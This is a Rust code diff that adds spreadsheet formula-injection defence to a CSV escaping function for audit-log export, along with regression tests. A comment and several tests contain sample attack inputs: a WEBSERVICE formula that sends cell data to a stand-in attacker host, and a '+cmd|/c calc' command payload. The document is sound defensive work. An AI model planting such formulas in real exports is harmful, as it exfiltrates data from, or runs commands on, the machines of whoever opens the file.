@@ -397,17 +397,35 @@ fn truncate_preview(text: &str, max_len: usize) -> String {
     }
 }
 
-/// Escape a string for CSV format
+/// Escape a string for CSV format.
 ///
-/// Wraps in quotes if contains comma, quote, or newline.
-/// Doubles any internal quotes.
+/// Handles two distinct concerns:
+/// 1. CSV structural escaping — wrap in quotes if the field contains a
+///    comma, double-quote, or newline; double any internal quotes.
+/// 2. Excel/Numbers formula-injection defense — if the field begins with a
+///    formula-trigger character (`=`, `+`, `-`, `@`, `\t`, `\r`), prefix
+///    a single quote so the spreadsheet treats it as text. Without this,
+///    a malicious chat content like `=WEBSERVICE("http://attacker/?data="&A1)`
+///    would exfiltrate the audit log when opened in Excel.
 fn escape_csv(s: &str) -> String {
-    let needs_quoting = s.contains(',') || s.contains('"') || s.contains('\n') || s.contains('\r');
+    // Check for formula-trigger chars at the very start, before any escaping.
+    // We do NOT trim — a leading space/tab preceding `=` is still risky.
+    let prefixed: std::borrow::Cow<'_, str> = match s.chars().next() {
+        Some('=') | Some('+') | Some('-') | Some('@') | Some('\t') | Some('\r') => {
+            std::borrow::Cow::Owned(format!("'{s}"))
+        }
+        _ => std::borrow::Cow::Borrowed(s),
+    };
+
+    let needs_quoting = prefixed.contains(',')
+        || prefixed.contains('"')
+        || prefixed.contains('\n')
+        || prefixed.contains('\r');
 
     if needs_quoting {
-        format!("\"{}\"", s.replace('"', "\"\""))
+        format!("\"{}\"", prefixed.replace('"', "\"\""))
     } else {
-        s.to_string()
+        prefixed.into_owned()
     }
 }
 
@@ -459,6 +477,52 @@ mod tests {
     #[test]
     fn test_escape_csv_with_newline() {
         assert_eq!(escape_csv("line1\nline2"), "\"line1\nline2\"");
+    }
+
+    // ============================================================================
+    // CSV formula-injection regression tests — protects audit-log export from
+    // triggering Excel/Numbers formulas when the auditor opens the file.
+    // ============================================================================
+
+    #[test]
+    fn escape_csv_neutralizes_equals_formula() {
+        // `=WEBSERVICE(...)` would exfiltrate cell contents to attacker.tld
+        // The single-quote prefix forces Excel to render the string literally.
+        let attack = "=WEBSERVICE(\"http://attacker.tld\")";
+        let out = escape_csv(attack);
+        assert!(out.starts_with('"'), "should be quoted for the embedded quote");
+        assert!(
+            out.contains("'=WEBSERVICE"),
+            "leading single quote missing: {out}"
+        );
+    }
+
+    #[test]
+    fn escape_csv_neutralizes_plus_minus_at_tab_cr() {
+        // When the field has no other CSV-escape trigger, the prefixed output
+        // is returned as-is. Use `starts_with` in that case.
+        assert!(escape_csv("+cmd|/c calc").starts_with("'+"));
+        assert!(escape_csv("-2+3").starts_with("'-"));
+        assert!(escape_csv("\tSUM(1)").starts_with("'\t"));
+
+        // When the field contains a comma, quote, newline, or \r it also gets
+        // wrapped in quotes — the single-quote prefix is still present, just
+        // inside the wrapping quotes.
+        let at_with_comma = escape_csv("@SUM(1,2)");
+        assert!(
+            at_with_comma.contains("'@"),
+            "formula prefix missing inside quoted field: {at_with_comma}"
+        );
+        let cr_attack = escape_csv("\rSUM(1)");
+        assert!(cr_attack.contains("'\r"), "formula prefix missing: {cr_attack:?}");
+    }
+
+    #[test]
+    fn escape_csv_preserves_legitimate_content() {
+        // A legitimate negative number in a numeric field is rare in audit
+        // logs (they're all text) but make sure normal strings are untouched.
+        assert_eq!(escape_csv("Sarah Chen"), "Sarah Chen");
+        assert_eq!(escape_csv("Marketing Manager"), "Marketing Manager");
     }
 
     #[test]
